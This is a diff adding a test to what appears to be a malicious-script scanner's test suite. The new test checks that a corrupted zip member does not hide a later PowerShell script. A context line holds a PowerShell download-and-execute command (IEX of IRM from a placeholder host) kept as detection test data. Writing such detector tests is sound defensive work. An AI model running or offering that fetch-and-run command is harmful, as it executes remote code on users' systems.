@@ -43,3 +43,15 @@ def test_powershell_continuation_preserves_download_flow():
         continued = f"IEX (`{newline}  IRM 'https://example.invalid')"
         assert inspect_script(continued.encode(), ".ps1")
         assert not inspect_script(f"# {continued}".encode(), ".ps1")
+
+
+def test_corrupt_zip_member_does_not_hide_later_script(tmp_path):
+    path = tmp_path / "mixed.zip"
+    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_STORED) as archive:
+        archive.writestr("first.txt", b"unique inert content")
+        archive.writestr("second.ps1", FLOW)
+    path.write_bytes(path.read_bytes().replace(b"unique inert content", b"Unique inert content", 1))
+    result = scan_folder(tmp_path)
+    assert result["skipped"] == 1
+    assert "first.txt" in result["errors"][0]
+    assert any("second.ps1" in hit["path"] for hit in result["findings"])
